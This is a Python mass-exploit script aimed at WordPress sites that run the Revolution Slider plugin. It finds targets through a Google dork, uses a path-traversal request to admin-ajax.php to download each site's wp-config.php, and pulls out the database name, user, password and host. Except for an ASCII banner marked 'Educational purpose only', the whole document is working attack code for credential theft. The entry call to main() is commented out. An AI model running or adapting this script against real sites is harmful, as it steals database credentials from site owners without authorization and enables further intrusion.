import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse
import random
import urllib.request


headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0"
        }
pages = str(10)
url = "https://www.google.com/search?q=revslider.php 'index of'&start="
req = requests.get(url, headers=headers)
soup = BeautifulSoup(req.text , "html.parser")
divs = soup.find('div', id='rso')

def main():
	a_tags = divs.find_all('div', class_='yuRUbf')
	dork = '/wp-admin/admin-ajax.php?action=revslider_show_image&img=' + '../wp-config.php'
	for i in a_tags:
		a = i.find('a',href=True)
		link = a.attrs['href']
		parse = urlparse(link)
		#let s join http and main url
		join_url = parse.scheme + '://' + parse.netloc
		#now let make the download link
		dorks = join_url + dork

		try:
			print('[ + ]Exploit link: '+ join_url + '\n ----------------------------------------------')

			name = 'admin' + str(random.randint(1,100)) + '.php'   # this will create the name like admin-123123.php
			z= urllib.request.urlretrieve(dorks , name)
			z
			print('[ + ] Downloaded!!\n')
		except Exception as e:
			print('[ - ]Not Found!')
		try:
			#lets search for db names
			for i in z:
				file = open(i , 'r')
				read = file.readlines()
				for a in read:
					strip = a.strip()

					if 'DB_NAME' in strip:
						print('[ + ] Found: ' + strip + '\n ---------------------------------------\n')

					if 'DB_USER' in strip:
						print('[ + ] Found: ' + strip + '\n ---------------------------------------\n')
					if 'DB_PASSWORD' in strip:
						print('[ + ] Found: ' + strip + '\n ---------------------------------------\n')
					if 'DB_HOST' in strip:
						print('[ + ] Found: ' + strip + '\n ---------------------------------------\n')
						

		except Exception as e:
			pass

    
def intro():
	print('''
                        _  _      _                                           
                       | |(_)    | |                                          
 _ __  ___ __   __ ___ | | _   __| |  ___  _ __   _ __ ___    __ _  ___  ___  
| '__|/ _ \\ \ / // __|| || | / _` | / _ \| '__| | '_ ` _ \  / _` |/ __|/ __| 
| |  |  __/ \ V / \__ \| || || (_| ||  __/| |    | | | | | || (_| |\__ \\__ \ 
|_|   \___|  \_/  |___/|_||_| _____| \___||_|    |_| |_| |_| \__,_||___/|___/ 
                   | |       (_)| |                                           
  ___ __  __ _ __  | |  ___   _ | |_                                          
 / _ \\ \/ /| '_ \ | | / _ \ | || __|                                         
|  __/ >  < | |_) || || (_) || || |_                                          
 \___|/_/\_\| .__/ |_| \___/ |_| \__|                                         
            | |                                                               
            |_|                                                               
Educational purpose only :)
credit to p4nda

		''')
if __name__ == '__main__':
	intro()
	# main()